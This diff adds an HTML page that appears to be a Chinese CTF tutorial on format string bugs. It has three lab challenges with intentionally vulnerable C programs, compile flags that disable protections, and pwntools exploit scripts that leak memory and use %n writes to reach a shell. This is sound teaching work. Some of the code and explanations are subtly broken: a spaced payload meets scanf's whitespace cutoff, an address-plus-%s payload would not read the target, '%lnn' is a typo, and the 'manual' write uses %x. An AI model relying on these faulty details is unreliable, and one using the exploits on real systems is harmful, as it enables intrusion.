@@ -1,0 +1,310 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CTF-Pwn 格式化字符串实战</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script src="https://unpkg.com/lucide@latest"></script>
+  <style>
+    code {
+      background: rgba(0,0,0,0.3);
+      padding: 2px 6px;
+      border-radius: 4px;
+    }
+    pre {
+      background: #1a1a1a;
+      padding: 1rem;
+      border-radius: 8px;
+      overflow-x: auto;
+    }
+    pre code {
+      background: none;
+      padding: 0;
+    }
+  </style>
+</head>
+<body class="min-h-screen bg-gray-900 text-gray-200 p-6 font-mono selection:bg-blue-500/30">
+  <div class="max-w-6xl mx-auto space-y-6">
+    
+    <div class="border-b border-gray-700 pb-4">
+      <a href="ctf-index.html" class="text-blue-400 hover:text-blue-300 text-sm flex items-center gap-1 mb-2">
+        <i data-lucide="arrow-left" class="w-4 h-4"></i>
+        返回CTF实战首页
+      </a>
+      <h1 class="text-2xl font-bold text-white flex items-center gap-2">
+        <i data-lucide="type" class="w-6 h-6 text-yellow-400"></i>
+        CTF-Pwn 格式化字符串实战
+      </h1>
+      <p class="text-gray-400 mt-2">3道题目，学习格式化字符串漏洞的泄露和写入利用。</p>
+    </div>
+
+    <!-- Challenge 1 -->
+    <div class="bg-gray-800 rounded-lg border border-gray-700 p-6">
+      <div class="flex items-center gap-3 mb-4">
+        <div class="w-10 h-10 bg-yellow-900/50 rounded-lg flex items-center justify-center text-white font-bold">1</div>
+        <div>
+          <h3 class="text-xl font-bold text-white">challenge1 - 泄露内存</h3>
+          <span class="text-xs text-yellow-400">入门</span>
+        </div>
+      </div>
+
+      <div class="mb-6">
+        <h4 class="text-green-400 font-bold mb-2">源码 (fmt1.c)</h4>
+        <pre><code class="text-gray-300">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+int main() {
+    char buf[100];
+    
+    printf("Enter your input: ");
+    scanf("%99s", buf);
+    
+    printf(buf);  // 危险！直接打印用户输入
+    
+    return 0;
+}</code></pre>
+        <div class="mt-3 bg-yellow-900/20 border border-yellow-800/50 rounded p-3 text-sm">
+          <div class="text-yellow-400 font-bold mb-1">漏洞分析</div>
+          <ul class="text-gray-300 space-y-1">
+            <li><span class="text-red-400">漏洞点：</span><code>printf(buf)</code> 而非 <code>printf("%s", buf)</code></li>
+            <li><span class="text-green-400">利用方法：</span>使用 <code>%x</code> 泄露栈上的数据</li>
+            <li><span class="text-blue-400">泄露原理：</span><code>%x</code> 会把栈上下一个参数以16进制输出</li>
+          </ul>
+        </div>
+      </div>
+
+      <div class="mb-6">
+        <h4 class="text-blue-400 font-bold mb-2">编译命令</h4>
+        <div class="bg-gray-900 rounded p-3 text-sm">
+          <code class="text-green-300">gcc -no-pie -fno-stack-protector -o fmt1 fmt1.c</code>
+        </div>
+      </div>
+
+      <div>
+        <h4 class="text-red-400 font-bold mb-2">Python 解题脚本</h4>
+        <pre><code class="text-gray-300">#!/usr/bin/env python3
+from pwn import *
+
+p = process('./fmt1')
+
+# 发送格式化字符串，泄露栈上的数据
+# %x 会把栈上后续内容以16进制打印出来
+payload = b'%x %x %x %x %x %x %x %x'
+
+print(f"Sending: {payload}")
+p.sendline(payload)
+
+# 接收输出
+response = p.recv()
+print("Response:")
+print(response)
+
+# 解析泄露的数据
+# 如果泄露的内存中包含flag或关键地址，会显示出来
+p.interactive()</code></pre>
+        <div class="mt-3 bg-gray-900/50 rounded p-3 text-sm">
+          <div class="text-yellow-400 font-bold mb-1">脚本解释</div>
+          <ul class="space-y-1 text-gray-300">
+            <li><code>%x</code> - 泄露一个16进制数（栈上的值）</li>
+            <li><code>%s</code> - 泄露指针指向的字符串</li>
+            <li><code>%p</code> - 更详细的指针格式泄露</li>
+            <li><code>%N$x</code> - 直接读取第N个参数，如 <code>%7$x</code> 读第7个</li>
+          </ul>
+        </div>
+      </div>
+    </div>
+
+    <!-- Challenge 2 -->
+    <div class="bg-gray-800 rounded-lg border border-gray-700 p-6">
+      <div class="flex items-center gap-3 mb-4">
+        <div class="w-10 h-10 bg-red-900/50 rounded-lg flex items-center justify-center text-white font-bold">2</div>
+        <div>
+          <h3 class="text-xl font-bold text-white">challenge2 - 泄露任意地址</h3>
+          <span class="text-xs text-red-400">进阶</span>
+        </div>
+      </div>
+
+      <div class="mb-6">
+        <h4 class="text-green-400 font-bold mb-2">源码 (fmt2.c)</h4>
+        <pre><code class="text-gray-300">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+
+char secret[] = "FLAG{test_flag_123}";  // 要泄露的内容
+
+int main() {
+    char buf[100];
+    
+    printf("Secret is at: %p\n", secret);  // 故意泄露地址
+    printf("Enter your input: ");
+    scanf("%99s", buf);
+    printf(buf);
+    printf("\n");
+    
+    return 0;
+}</code></pre>
+        <div class="mt-3 bg-yellow-900/20 border border-yellow-800/50 rounded p-3 text-sm">
+          <div class="text-yellow-400 font-bold mb-1">漏洞分析</div>
+          <ul class="text-gray-300 space-y-1">
+            <li><span class="text-red-400">漏洞点：</span>仍然是 <code>printf(buf)</code> 格式化字符串漏洞</li>
+            <li><span class="text-green-400">利用方法：</span>利用 <code>%s</code> 配合已知地址泄露内容</li>
+            <li><span class="text-blue-400">泄露原理：</span>程序故意打印了 <code>secret</code> 的地址，我们用 <code>%s</code> 读取</li>
+          </ul>
+        </div>
+      </div>
+
+      <div class="mb-6">
+        <h4 class="text-blue-400 font-bold mb-2">编译命令</h4>
+        <div class="bg-gray-900 rounded p-3 text-sm">
+          <code class="text-green-300">gcc -no-pie -fno-stack-protector -o fmt2 fmt2.c</code>
+        </div>
+      </div>
+
+      <div>
+        <h4 class="text-red-400 font-bold mb-2">Python 解题脚本</h4>
+        <pre><code class="text-gray-300">#!/usr/bin/env python3
+from pwn import *
+
+p = process('./fmt2')
+
+# 第一步：获取secret地址
+p.recvuntil("Secret is at: ")
+secret_addr = int(p.recvline().strip(), 16)  # 解析地址
+print(f"Secret address: {hex(secret_addr)}")
+
+# 第二步：构造格式化字符串，泄露该地址的内容
+# %s 会把指定地址的内容当作字符串输出
+# %N$s 读取第N个参数指向的地址
+# 我们需要把secret地址放在栈上适当位置
+
+# 构造payload: 地址 + 格式化字符串
+payload = p64(secret_addr) + b'%s'
+
+p.sendline(payload)
+flag = p.recvline()
+print(f"Flag: {flag}")
+
+p.interactive()</code></pre>
+        <div class="mt-3 bg-gray-900/50 rounded p-3 text-sm">
+          <div class="text-yellow-400 font-bold mb-1">关键技巧</div>
+          <ul class="space-y-1 text-gray-300">
+            <li>程序泄露了地址 <code>%p</code>，我们就知道了 <code>secret</code> 在哪里</li>
+            <li><code>%s</code> 会把栈上的值当作指针，读取它指向的字符串</li>
+            <li>如果我们把地址放在栈顶，<code>%s</code> 就会读取那个地址的内容</li>
+          </ul>
+        </div>
+      </div>
+    </div>
+
+    <!-- Challenge 3 -->
+    <div class="bg-gray-800 rounded-lg border border-gray-700 p-6">
+      <div class="flex items-center gap-3 mb-4">
+        <div class="w-10 h-10 bg-purple-900/50 rounded-lg flex items-center justify-center text-white font-bold">3</div>
+        <div>
+          <h3 class="text-xl font-bold text-white">challenge3 - 格式化字符串写</h3>
+          <span class="text-xs text-purple-400">高阶</span>
+        </div>
+      </div>
+
+      <div class="mb-6">
+        <h4 class="text-green-400 font-bold mb-2">源码 (fmt3.c)</h4>
+        <pre><code class="text-gray-300">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+
+int win = 0;  // 目标：写入这个变量
+
+int main() {
+    char buf[100];
+    
+    printf("win is at: %p\n", &win);
+    printf("Enter your input: ");
+    scanf("%99s", buf);
+    printf(buf);
+    printf("\nwin = %d\n", win);
+    
+    if (win == 0xbeef) {  // 如果win被改成这个值就调用system
+        system("/bin/sh");
+    }
+    
+    return 0;
+}</code></pre>
+        <div class="mt-3 bg-yellow-900/20 border border-yellow-800/50 rounded p-3 text-sm">
+          <div class="text-yellow-400 font-bold mb-1">漏洞分析</div>
+          <ul class="text-gray-300 space-y-1">
+            <li><span class="text-red-400">漏洞点：</span><code>printf(buf)</code> 格式化字符串漏洞</li>
+            <li><span class="text-green-400">利用方法：</span>使用 <code>%n</code> 写入内存</li>
+            <li><span class="text-blue-400">写入原理：</span><code>%n</code> 把已输出的字符数写入指定地址</li>
+            <li><span class="text-purple-400">技巧：</span>配合地址写入 + <code>%N$x</code> 指定参数位置</li>
+          </ul>
+        </div>
+      </div>
+
+      <div class="mb-6">
+        <h4 class="text-blue-400 font-bold mb-2">编译命令</h4>
+        <div class="bg-gray-900 rounded p-3 text-sm">
+          <code class="text-green-300">gcc -no-pie -fno-stack-protector -o fmt3 fmt3.c</code>
+        </div>
+      </div>
+
+      <div>
+        <h4 class="text-red-400 font-bold mb-2">Python 解题脚本</h4>
+        <pre><code class="text-gray-300">#!/usr/bin/env python3
+from pwn import *
+
+p = process('./fmt3')
+
+# 获取win变量地址
+p.recvuntil("win is at: ")
+win_addr = int(p.recvline().strip(), 16)
+print(f"win address: {hex(win_addr)}")
+
+# %n: 把已输出字符数写入栈上指定的地址
+# 构造: [地址][填充到指定位置][%N$x]... 最后一个用 %N$n 写入
+
+# 简化版：直接用 %N$n 写入
+# 把win地址放在栈上第6个参数位置（需要调试确认）
+
+# 方法1：使用 fmtstr_payload 自动生成
+from pwn import fmtstr_payload
+
+# 写入win地址，值为0xbeef
+payload = fmtstr_payload(6, {win_addr: 0xbeef})
+
+print(f"Payload length: {len(payload)}")
+p.sendline(payload)
+p.interactive()
+
+# 方法2：手动构造
+# 已知 win_addr = 0x......., 我们想让 %N$x 读到它
+# payload = p64(win_addr) + b'%6$x'  # 如果win在第6个参数</code></pre>
+        <div class="mt-3 bg-gray-900/50 rounded p-3 text-sm">
+          <div class="text-yellow-400 font-bold mb-1">%n 写入原理</div>
+          <ul class="space-y-1 text-gray-300">
+            <li><code>%n</code> - 写入4字节，把已输出字符总数写入目标地址</li>
+            <li><code>%hn</code> - 写入2字节</li>
+            <li><code>%lnn</code> - 写入8字节 (64位)</li>
+            <li><code>%N$x</code> - 直接读/写第N个参数</li>
+            <li><code>fmtstr_payload(offset, writes)</code> - pwntools自动生成格式化字符串exploit</li>
+          </ul>
+        </div>
+      </div>
+    </div>
+
+    <div class="flex justify-between">
+      <a href="ctf-stack-overflow.html" class="bg-gray-700 hover:bg-gray-600 text-white py-2 px-4 rounded font-bold transition-all">
+        ← 栈溢出实战
+      </a>
+      <a href="ctf-rop.html" class="bg-green-700 hover:bg-green-600 text-white py-2 px-4 rounded font-bold transition-all">
+        ROP实战 →
+      </a>
+    </div>
+
+  </div>
+
+  <script>
+    lucide.createIcons();
+  </script>
+</body>
+</html>
